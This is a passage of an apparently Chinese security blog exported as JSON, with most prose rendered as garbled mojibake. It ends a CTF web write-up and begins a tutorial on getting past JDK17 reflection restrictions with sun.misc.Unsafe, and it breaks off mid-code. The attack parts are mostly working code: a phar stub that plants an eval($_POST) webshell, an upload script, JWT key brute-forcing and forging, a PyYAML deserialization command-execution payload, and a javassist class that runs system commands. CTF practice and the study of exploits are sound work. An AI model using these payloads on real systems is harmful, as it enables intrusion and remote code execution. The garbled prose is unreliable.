·å…¶å®ä¸Šé¢è®¾ç½®çš„ä¸€äº›ç±»éƒ½æ²¡ç”¨åˆ°ï¼‰ï¼Œé‚£ä¹ˆå°±æ˜¯ç›´æ¥æ‰“äº†ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š\nç”Ÿæˆpharæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $phar = new Phar(\u0026#39;f.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub( \u0026#34; \u0026lt;?php system(\u0026#39;echo \\\u0026#39;\u0026lt;?php eval(\\$_POST[123]);?\u0026gt;\\\u0026#39; \u0026gt; 1.php\u0026#39;); __HALT_COMPILER(); ?\u0026gt; \u0026#34; ); $phar-\u0026gt;addFromString(\u0026#39;f\u0026#39;, \u0026#39;1\u0026#39;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; ç„¶åå°†ç”Ÿæˆçš„f.pharæ–‡ä»¶å‹ç¼©å†è¿›è¡Œåç»­åˆ©ç”¨ï¼Œæœ€å¼€å§‹æˆ‘æ˜¯ç›´æ¥å‘½ä»¤æ‰§è¡Œçš„ï¼Œä½†æ˜¯å‘ç°éœ€è¦ææƒï¼š\næ•…ç›´æ¥å†™é©¬æ–¹ä¾¿äº›ï¼Œç„¶åå‹ç¼©ï¼š\n1 gzip -c f.phar \u0026gt; f.phar.gz ç„¶åç”¨ä¸€ä¸ªè„šæœ¬æ¥ä¸Šä¼ æ•°æ®æ–¹ä¾¿å†™å…¥æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests # PHP æ¥å£ URL url = \u0026#34;http://web-1b469e626a.challenge.xctf.org.cn/\u0026#34; # æœ¬åœ°è¦è¯»å–çš„æ–‡ä»¶ local_file_path = \u0026#34;f.phar.gz\u0026#34; # è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ with open(local_file_path, \u0026#34;rb\u0026#34;) as f: file_data = f.read() print(file_data) # POST æ•°æ®ï¼ŒPHP æ¥æ”¶ $_POST[0] post_data = {0: file_data,1:\u0026#39;O:7:\u0026#34;Acheron\u0026#34;:1:{s:4:\u0026#34;mode\u0026#34;;s:1:\u0026#34;w\u0026#34;;}\u0026#39;} # å‘é€ POST è¯·æ±‚ response = requests.post(url, data=post_data) # è¾“å‡º PHP è¿”å›çš„æ–‡ä»¶è·¯å¾„ print(\u0026#34;PHP å†™å…¥çš„æ–‡ä»¶è·¯å¾„:\u0026#34;, response.text) ç„¶åæ‹¿åˆ°æ–‡ä»¶åå»å†å»æ–‡ä»¶åŒ…å«è§¦å‘ï¼š\nç°åœ¨å°±å»è®¿é—®1.phpè¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯ï¼Œè¿™é‡Œç›´æ¥è¿èšå‰‘ï¼Œæ ¹ç›®å½•æƒ…å†µå¦‚ä¸‹ï¼š\nflagéœ€è¦rootæƒé™ï¼Œç„¶åè¯»ä¸€ä¸‹run.shæ–‡ä»¶ï¼š\nä»Šå¹´å¹´åˆæ‰“çš„n1juniorçš„backupé¢˜ï¼Œè€ƒç‚¹æ˜¯cpé€šé…ç¬¦ææƒï¼Œå°±æ˜¯cpå‘½ä»¤çš„-Lé€‰é¡¹ä¼šä¿ç•™è½¯é“¾æ¥(always follow symbolic links in SOURCE)ï¼Œè€Œä¸”/var/www/htmlä¸‹ä¹Ÿæœ‰backupç›®å½•ï¼Œæ‰€ä»¥ç›´æ¥å¦‚ä¸‹æ‰“å³å¯ï¼š\nå³å¯æ‹¿åˆ°flag:\n1 flag{EP1cyS4CHOVJekHsnCZ7m7HeZpEMLFAu} â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nez_python å†²å†²å†²\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå¼€å±€å¯ä»¥å°è¯•å¾€åç«¯æäº¤ä»£ç å¹¶åˆ¶å®šæ¨¡å¼ï¼›\nä¹Ÿå°±æ˜¯è¿™é‡Œçš„tamlä»¥åŠpythonï¼Œä½†æ˜¯ä¼¼ä¹éƒ½æ˜¯åªèƒ½ä»¥adminç”¨æˆ·æ‰èƒ½ä½¿ç”¨ã€‚\næŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œæœ‰ä¸€äº›éå¸¸é‡è¦çš„ä¿¡æ¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;script\u0026gt; let token = \u0026#34;\u0026#34;; fetch(\u0026#34;/auth\u0026#34;) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; { token = data.token; const payload = JSON.parse(atob(token.split(\u0026#39;.\u0026#39;)[1])); document.getElementById(\u0026#34;user-info\u0026#34;).innerHTML = \u0026#34;\u0026lt;span style=\u0026#39;color:#444\u0026#39;\u0026gt;ğŸ‘¤ \u0026#34; + payload.username + \u0026#34;\u0026lt;/span\u0026gt; | \u0026#34; + \u0026#34;\u0026lt;span style=\u0026#39;color:#4CAF50\u0026#39;\u0026gt;Role: \u0026#34; + payload.role + \u0026#34;\u0026lt;/span\u0026gt;\u0026#34;; }); function runCode() { const fileInput = document.getElementById(\u0026#39;codefile\u0026#39;); const mode = document.getElementById(\u0026#34;mode\u0026#34;).value; if (fileInput.files.length === 0) { document.getElementById(\u0026#34;result\u0026#34;).textContent = \u0026#39;{\u0026#34;error\u0026#34;: \u0026#34;Please select a file to upload.\u0026#34;}\u0026#39;; return; } const file = fileInput.files[0]; const formData = new FormData(); formData.append(\u0026#39;codefile\u0026#39;, file); formData.append(\u0026#39;mode\u0026#39;, mode); fetch(\u0026#34;/sandbox\u0026#34;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Authorization\u0026#34;: \u0026#34;Bearer \u0026#34; + token }, body: formData }) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; { document.getElementById(\u0026#34;result\u0026#34;).textContent = JSON.stringify(data, null, 2); }); } \u0026lt;/script\u0026gt; ç¬¬ä¸€ä¸ªå°±æ˜¯åœ¨é¡µé¢åˆå§‹é˜¶æ®µå°±ä¼šfetchä¸€ä¸‹authæ¥è·å–tokenï¼Œç„¶ååœ¨åç»­çš„è°ƒç”¨ä¸­éƒ½ä¼šå¸¦ä¸ŠAuthorizationæ¥è¿›è¡Œèº«ä»½è¯†åˆ«ï¼ŒåŸºæœ¬å°±å¯ä»¥çŒœæµ‹æ˜¯éœ€è¦çŸ¥é“ä¼ªé€ jwtäº†ï¼Œé‚£ä¹ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ¥ä»è¯·æ±‚åŒ…è·å–åˆ°tokenï¼š\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E è§£ç å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š\nå¯¹ç§°å¯†é’¥ï¼Œç„¶åå°†payloadä¸­çš„å‚æ•°ä¿®æ”¹ä¸ºadminï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨jwtä¼ªé€ çš„æ–¹æ³•ï¼Œå…ˆæ˜¯å°è¯•è¿‡ç›´æ¥çˆ†ç ´å¼±å¯†é’¥ï¼Œæ²¡æˆåŠŸï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•æ‰“ä¸€ä¸‹å°†ç®—æ³•ä¿®æ”¹ä¸ºnoneï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import jwt header = { \u0026#34;alg\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34; } content = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } token = jwt.encode( content, \u0026#34;\u0026#34;, # å¯†é’¥ï¼Œæ­¤å¤„ç½®ä¸ºç©º algorithm=\u0026#34;none\u0026#34;, # åŠ å¯†æ–¹å¼ headers=header ) print(token) å°†ç”Ÿæˆçš„tokenæ‹¿å»ä¼ å‚ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š\n1 {\u0026#34;error\u0026#34;:\u0026#34;JWT Decode Failed. Key Hint\u0026#34;,\u0026#34;hint\u0026#34;:\u0026#34;Key starts with \\\u0026#34;@o70xO$0%#qR9#**\\\u0026#34;. The 2 missing chars are alphanumeric (letters and numbers).\u0026#34;} jwtè§£ç å¤±è´¥ï¼Œç»™äº†ä¸€ä¸ªhintï¼Œä¹Ÿå°±æ˜¯éƒ¨åˆ†å¯†é’¥ä»¥åŠè¯´æ˜äº†åä¸¤ä½æ˜¯å­—æ¯å’Œæ•°å­—ï¼Œé‚£ä¹ˆç”¨ä¸€ä¸ªpythonè„šæœ¬æ¥è¿›è¡Œçˆ†ç ´ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python3 import itertools import string import jwt # === å›ºå®šé…ç½® === TOKEN = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E\u0026#34; PREFIX = \u0026#34;@o70xO$0%#qR9#\u0026#34; ALG = \u0026#34;HS256\u0026#34; CHARSET = string.ascii_letters + string.digits # a-zA-Z0-9 def brute_force(): for c1, c2 in itertools.product(CHARSET, repeat=2): key = PREFIX + c1 + c2 try: payload = jwt.decode(TOKEN, key, algorithms=[ALG]) print(\u0026#34;[+] æ‰¾åˆ°å¯†é’¥:\u0026#34;, key) print(\u0026#34;[+] payload:\u0026#34;, payload) return except jwt.InvalidTokenError: continue print(\u0026#34;[-] æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„å¯†é’¥\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: brute_force() ç„¶åå°±æˆåŠŸçˆ†ç ´å‡ºå¯†é’¥ï¼š\n1 2 [+] æ‰¾åˆ°å¯†é’¥: @o70xO$0%#qR9#m0 [+] payload: {\u0026#39;username\u0026#39;: \u0026#39;guest\u0026#39;, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;} å†ä½¿ç”¨ç”Ÿæˆå¯¹åº”çš„tokenå³å¯ï¼š\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.-Ws9e4GwaL0hesqjmSuOKNmyximBStder-7VnXK0w70 éšåå°±å¯ä»¥è¿›è¡Œåˆ©ç”¨äº†ï¼š ç°åœ¨å†çœ‹å¯ä»¥åœ¨å“ªé‡Œè¿›è¡Œåˆ©ç”¨ï¼Œyamlï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°pyyamlååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸ªpayloadç„¶åæ”¹æˆæœ‰å›æ˜¾çš„å³å¯ï¼š\n1 2 3 4 !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f1111ag\u0026#39;).read()\u0026#34;] å³å¯æ‹¿åˆ°flagï¼š\nflagå¦‚ä¸‹ï¼š\n1 flag{D5qHNyothAJjypNotQhKybuOaMwkkwjb} æ‰€ä»¥è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯ä¸€ä¸ªjwtä¼ªé€ +pyyamlååºåˆ—åŒ–ï¼Œè¿˜æ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚\n","date":"2025-09-09T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFweb%E5%85%A8%E8%A7%A3/","title":"2025æ¹¾åŒºæ¯webå…¨è§£"},{"content":"JDK17ä¸‹çš„åå°„ç»•è¿‡ åœ¨å‰é¢é“¾å­çš„å­¦ä¹ ä¸­ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šé“¾å­çš„ä½¿ç”¨éƒ½éœ€è¦ç”¨åˆ°åå°„ï¼ŒåŒ…æ‹¬æœ€ç»å…¸çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡åå°„æ¥è¿›è¡Œçš„ç±»å˜é‡çš„è®¾ç½®ã€‚ä½†æ˜¯éšç€JDKç‰ˆæœ¬çš„æ›´æ›¿ï¼Œåœ¨jdk17ç‰ˆæœ¬åï¼ŒçœŸæ­£æ„ä¹‰ä¸Šå¯¹åå°„è¿›è¡Œäº†é™åˆ¶ã€‚\nä¸‹é¢ä»å‡ ä¸ªæ–¹é¢æ¥äº†è§£JDK17ä¸‹çš„é™åˆ¶ä»¥åŠå¦‚ä½•è¿›è¡Œç»•è¿‡ã€‚\nè®°å¾—æ”¹jdké…ç½®ï¼Œè¿˜æ˜¯å‚è€ƒå¦‚ä¸‹æ–‡ç« å³å¯ï¼š\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\nä¸‹é¢è¿™ä¸ªåœ°æ–¹å®¹æ˜“å¿˜ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå‰æƒ…æè¦ æ¨¡å—åŒ–æœºåˆ¶ç®€å•äº†è§£ ä»JDK9å¼€å§‹,å°±ä¸å¾—ä¸æåˆ°ä¸€ä¸ªæ–°çš„æœºåˆ¶ï¼šæ¨¡å—åŒ–ç³»ç»Ÿã€‚\nè¿™ä¸ªæ¨¡å—åŒ–ç³»ç»Ÿæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿéšç€Javaçš„å‘å±•ï¼Œè¦ä½¿ç”¨çš„ä»£ç é€æ¸å¢å¤šï¼Œæ·»åŠ çš„è‡ªå®šä¹‰åº“æˆ–ç¬¬ä¸‰æ–¹ä¾èµ–è¶Šæ¥è¶Šå¤šï¼Œå¯èƒ½é€ æˆåŒ…è®¿é—®å†²çªä»¥åŠå…¼å®¹æ€§é—®é¢˜ï¼Œæ‰€ä»¥åœ¨JDK9è¿‡åï¼Œæå‡ºäº†ä¸€ä¸ªæ¨¡å—åŒ–ç³»ç»Ÿæ¥æ”¹å–„è¿™ä¸ªæƒ…å†µã€‚å¯ä»¥å°†ä¸€äº›çš„ä»£ç å°è£…æˆä¸€ä¸ªaæ¨¡å—å¹¶å®ç°ä¸€äº›åŠŸèƒ½ï¼Œå¹¶é€šè¿‡å½“å‰æ¨¡å—ä¸­çš„module-info.javaæ–‡ä»¶ä¸­çš„å®šä¹‰ï¼Œä½¿å¾—å¯ä»¥ç›´æ¥å®šä¹‰åˆ°ä¸€äº›aæ¨¡å—éœ€è¦è°ƒç”¨çš„bæ¨¡å—çš„ç±»çš„ä½ç½®ï¼Œä»¥é˜²å‡ºç°ClassNotFoundExceptionçš„å¼‚å¸¸ã€‚\nåœ¨å½“å‰æ¨¡å—å†…éƒ¨çš„ç±»çš„è°ƒç”¨æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œä½†æ˜¯ä¸åŒæ¨¡å—ä¸­çš„è°ƒç”¨æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ¯”å¦‚aæ¨¡å—åªèƒ½è°ƒç”¨bæ¨¡å—çš„exportçš„ç±»ï¼Œç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š\n1 2 3 4 5 module com.example.modulea { requires com.example.moduleb; // ä¾èµ–äºæ¨¡å—moduleb exports com.example.modulea.publicpackage; // å¯¹å¤–å…¬å¼€çš„åŒ… } //module-info.java ç”±äºæ¨¡å—åŒ–æœºåˆ¶è®©ä¸€éƒ¨åˆ†ç±»å¹¶æ²¡æœ‰è¢«å…¬å¼€ï¼Œæ‰€ä»¥å½±å“åˆ°äº†åå°„çš„åˆ©ç”¨ã€‚\njdk17æ–°ç‰¹æ€§-å¼ºå°è£… åå°„åˆ©ç”¨ï¼Œä»jdk9åˆ°jdk16éƒ½æ²¡æœ‰ç¦æ­¢ï¼Œåªæ˜¯æå‡ºè­¦å‘Šï¼Œç›´åˆ°jdk17çš„æ–°ç‰¹æ€§æ‰ç¦æ­¢ï¼Œä¹Ÿå°±æ˜¯å¼ºå°è£…ã€‚\nåœ¨å®˜æ–¹æ–‡æ¡£ä¸­çš„è¯´æ³•ï¼šä¸€äº›å·¥å…·å’Œåº“ä½¿ç”¨åå°„æ¥è®¿é—®JDKä¸­ä»…ä¾›å†…éƒ¨ä½¿ç”¨çš„éƒ¨åˆ†ã€‚è¿™ç§åå°„çš„ä½¿ç”¨ä¼šå¯¹JDKçš„å®‰å…¨æ€§å’Œå¯ç»´æŠ¤æ€§äº§ç”Ÿè´Ÿé¢å½±å“ã€‚ä¸ºäº†å¸®åŠ©è¿ç§»ï¼ŒJDK 9åˆ°JDK 16å…è®¸è¿™ç§åå°„ç»§ç»­è¿›è¡Œï¼Œä½†æ˜¯ä¼šå‘å‡ºå…³äºéæ³•åå°„è®¿é—®çš„è­¦å‘Šã€‚ä½†æ˜¯ï¼ŒJDK 17æ˜¯å¼ºå°è£…çš„ï¼Œå› æ­¤é»˜è®¤æƒ…å†µä¸‹ä¸å†å…è®¸æ­¤åå°„ã€‚è®¿é—®java.*çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•çš„ä»£ç ä¼šæŠ¥é”™InaccessibleObjectExceptionã€‚\nä½†æ˜¯sun.misc and sun.reflect ä¸‹çš„åŒ…è¿˜æ˜¯å¯ä»¥ä½¿ç”¨åå°„çš„ã€‚\nåœ¨è¿™é‡Œå°±æ˜¯è¦åˆ©ç”¨åˆ°.sun.misc.UnSafeç±»æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨ã€‚\nå®ä¾‹è¯´æ˜ JDK8 è¿™é‡Œåˆ©ç”¨defineClass()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨åŠ è½½ï¼Œå…·ä½“ä»£ç å°±ä¸è¯´äº†ï¼Œå°±æ˜¯ä¸€ä¸ªè·å–åˆ°ç›¸å…³classæ–‡ä»¶çš„base64ç¼–ç å†…å®¹çš„æ–¹æ³•è°ƒç”¨ï¼š\nç„¶ååå°„è°ƒç”¨defineClass()æ–¹æ³•æ¥åŠ è½½ï¼Œæˆ‘è¿™é‡Œæ˜¯ç›´æ¥ä½¿ç”¨javassistæ¥åŠ è½½ä¸€ä¸ªç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import javassist.*; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); CtConstructor constructor = new CtConstructor(new CtClass[]{}, cc); constructor.setBody(\u0026#34;{ try {\\n\u0026#34; + \u0026#34; Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\\n\u0026#34; + \u0026#34; } catch (Exception e) {\\n\u0026#34; + \u0026#34; System.exit(0);\\n\u0026#34; + \u0026#34; } }\u0026#34;); cc.addConstructor(constructor); byte[] classBytes = cc.toBytecode(); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Evil\u0026#34;, classBytes, 0, classBytes.length); clazz.newInstance(); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œæ— ä»»ä½•é”™è¯¯ã€‚\nJDK11 è¿˜æ˜¯ä¹‹å‰çš„ä»£ç ï¼Œè¿è¡ŒååŒæ ·å¯ä»¥å¼¹å‡ºè®¡ç®—æœºï¼Œä½†æ˜¯ä¼šåœ¨æ§åˆ¶å°è¾“å‡ºè­¦å‘Šçš„å†…å®¹ï¼š\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by org.example.Main (file:/java_learn/maven_text/target/test-classes/) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) WARNING: Please consider reporting this to the maintainers of org.example.Main WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release Jdk17 ç›´æ¥æŠ¥é”™å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not \u0026#34;opens java.lang\u0026#34; to unnamed module @673bfdf3 at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354) at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297) at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199) at java.base/java.lang.reflect.Method.setAccessible(Method.java:193) at org.example.Main.main(Main.java:21) ç»•è¿‡åˆ†æ ä»jdk17çš„æŠ¥é”™æ¥çœ‹å°±æ˜¯åœ¨setAccessible()å‡ºäº†é—®é¢˜ï¼Œè·Ÿè¿›æŠ¥é”™æå‡ºçš„æ–¹æ³•ï¼š\n1 2 3 4 5 public void setAccessible(boolean flag) { AccessibleObject.checkPermission(); if (flag) checkCanSetAccessible(Reflection.getCallerClass()); setAccessible0(flag); } å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯é€šè¿‡checkCanSetAccessible()æ–¹æ³•æ¥åˆ¤æ–­å¯¹åº”åå°„è°ƒç”¨çš„ç±»æ˜¯å¦å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œç»§ç»­è·Ÿè¿›åˆ°å…³é”®çš„ä»£ç ï¼š\nå¯ä»¥çœ‹å‡ºè¿™é‡Œçš„Reflection.getCallerClass()å°±æ˜¯çœ‹æ•´ä¸ªç¨‹åºå‘èµ·çš„callerï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„Mainï¼Œè€Œclazzå°±æ˜¯åå°„è°ƒç”¨çš„ç±»çš„classå¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nå…³é”®çš„checkCanSetAccessible()å…¨ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 private boolean checkCanSetAccessible(Class\u0026lt;?\u0026gt; caller, Class\u0026lt;?\u0026gt; declaringClass, boolean throwExceptionIfDenied) { if (caller == MethodHandle.class) { throw new IllegalCallerException(); // should not happen } Module callerModule = caller.getModule(); Module declaringModule = declaringClass.getModule(); if (callerModule == declaringModule) return true; if (callerModule == Object.class.getModule()) return true; if (!declaringModule.isNamed()) return true; String pn = declaringClass.getPackageName(); int modifiers; if (this instanceof Executable) { modifiers = ((Executable) this).getModifiers(); } else { modifiers = ((Field) this).getModifiers(); } // class is public and package is exported to caller boolean isClassPublic = Modifier.isPublic(declaringClass.getModifiers()); if (isClassPublic \u0026amp;\u0026amp; declaringModule.isExported(pn, callerModule)) { // member is public if (Modifier.isPublic(modifiers)) { return true; } // member is protected-static if (Modifier.isProtected(modifiers) \u0026amp;\u0026amp; Modifier.isStatic(modifiers) \u0026amp;\u0026amp; isSubclassOf(caller, declaringClass)) { return true; } } // package is open to caller if (declaringModule.isOpen(pn, callerModule)) { return true; } if (throwExceptionIfDenied) { // not accessible String msg = \u0026#34;Unable to make \u0026#34;; if (this instanceof Field) msg += \u0026#34;field \u0026#34;; msg += this + \u0026#34; accessible: \u0026#34; + declaringModule + \u0026#34; does not \\\u0026#34;\u0026#34;; if (isClassPublic \u0026amp;\u0026amp; Modifier.isPublic(modifiers)) msg += \u0026#34;exports\u0026#34;; else msg += \u0026#34;opens\u0026#34;; msg += \u0026#34; \u0026#34; + pn + \u0026#34;\\\u0026#34; to \u0026#34; + callerModule; InaccessibleObjectException e = new InaccessibleObjectException(msg); if (printStackTraceWhenAccessFails()) { e.printStackTrace(System.err); } throw e; } return false; } åœ¨ä»£ç åé¢éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥é”™çš„å†…å®¹ï¼Œå¹¶ä¸”ä»å‚æ•°ä¼ é€’æ¥çœ‹ï¼Œè¿™é‡Œå°±æ˜¯éœ€è¦åˆ°if (throwExceptionIfDenied)åˆ¤æ–­éƒ¨åˆ†å‰æˆåŠŸè¿”å›trueä»è€Œé€€å‡ºï¼Œä¸ç„¶å°±è‚¯å®šä¼šæŠ¥é”™é€€å‡ºã€‚å†çœ‹å‰é¢çš„ä»£ç ï¼š\nè¿™é‡Œçš„getModule()æ–¹æ³•å°±æ˜¯è·å–æ¨¡å—çš„è·¯å¾„ï¼Œå¦‚æœå‘èµ·ç±»çš„æ¨¡å—å’Œè¢«åå°„ç±»çš„æ¨¡å—æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±ç›´æ¥è¿”å›trueï¼Œä½†æ˜¯é‡ç‚¹çš„å°±æ˜¯è¿™ç¬¬äºŒä¸ªåˆ¤æ–­æ–¹å¼ï¼ˆæ ¹æ®åé¢çš„åˆ©ç”¨æ–¹æ³•ï¼Œï¼‰ï¼Œå¦‚æœå‘èµ·ç±»çš„æ¨¡å—ä½ç½®å’ŒObject.classçš„ä½ç½®ç›¸åŒï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿”å›trueã€‚\nObject.classçš„å¦‚ä¸‹ï¼š\næ˜¯å’Œè¢«åå°„çš„ç±»ç›¸åŒï¼Œä½†æ˜¯å’Œæˆ‘ä»¬å‘èµ·çš„ç±»æ¨¡å—ä½ç½®ä¸åŒï¼š\né‚£ä¹ˆå¦‚ä½•åˆ©ç”¨å‘¢ï¼Œè¿™é‡Œå°±éœ€è¦åˆ©ç”¨åˆ°UnSafeç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„ç±»ï¼Œå¯ä»¥æ“ä½œå†…å­˜ç©ºé—´ï¼Œå¹¶ä¸”è¿™ä¸ªç±»ä½äºsun.miscï¼Œåœ¨æ‰€æœ‰jdkç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥ç›´æ¥åå°„è°ƒç”¨çš„ï¼Œå¹¶ä¸”å…¶å­˜åœ¨ä¸€ä¸ªå…³é”®çš„æ–¹æ³•ï¼š\nè¿™ä¸ªæ–¹æ³•å¯ä»¥è‡ªåŠ¨åœ°å°†ç»™å®šçš„å‚è€ƒå€¼ä¸ç»™å®šå¯¹è±¡ä¸­å­—æ®µæˆ–æ•°ç»„å…ƒç´ çš„å½“å‰å‚è€ƒå€¼è¿›è¡Œäº¤æ¢ã€‚\nä»å‚æ•°ä¸­å¯ä»¥çœ‹å‡ºéœ€è¦å­—æ®µæˆ–æ•°ç»„å…ƒç´ çš„åœ°å€çš„åç§»é‡,åŒæ ·è¿™ä¸ªUnSafeç±»ç»™å‡ºäº†ä¸€ä¸ªè·å–å­—æ®µçš„å†…å­˜çš„åç§»é‡çš„objectFieldOffset()æ–¹æ³•ï¼š\næ‰€ä»¥ç°åœ¨çš„æ€è·¯å°±æ˜¯é€šè¿‡UnSafeçš„è¿™ä¸ªç±»ï¼Œæ¥å°†æˆ‘ä»¬çš„å‘èµ·ç±»çš„getModule()è¿”å›çš„ç»“æœå’ŒObject.classçš„ç»“æœå˜å¾—ä¸€æ ·ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸè¿”å›trueä»è€Œæ­£å¸¸åå°„è°ƒç”¨ã€‚\næ•…ç°åœ¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ä»£ç æ¥å°è¯•å°†moduleä¿®æ”¹æˆæƒ³è¦çš„å€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import sun.misc.Unsafe; import java.lang.Module; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { System.out.println(\u0026#34;ä¿®æ”¹å‰ï¼š\u0026#34;+Main.class.getModule()); //ä¿®æ”¹ä¸­ Field field = Unsafe.class.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); field.setAccessible(true); Unsafe unsafe = (Unsafe) field.get(null); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); Module targetModule = Object.class.getModule(); unsafe.getAndSetObject(Main.class, offset,targetModule); System.out.println(\u0026#34;ä¿®æ”¹åï¼š\u0026#34;+Main.class.getModule()); } } /*output: ä¿®æ”¹å‰ï¼šunnamed module @673bfdf3 ä¿®æ”¹åï¼šmodule java.base */ å¯ä»¥çœ‹åˆ°æˆåŠŸå°†å½“å‰æœªå‘½åçš„æ¨¡å—æ”¹æˆäº†Object.classå¯¹åº”çš„moduleçš„æ¨¡å—ä½ç½®ï¼Œä»è€Œå¯ä»¥æˆåŠŸè°ƒç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import sun.misc.Unsafe; import java.lang.Module; import java.lang.reflect.Field; import java.lang.reflect.Method; import 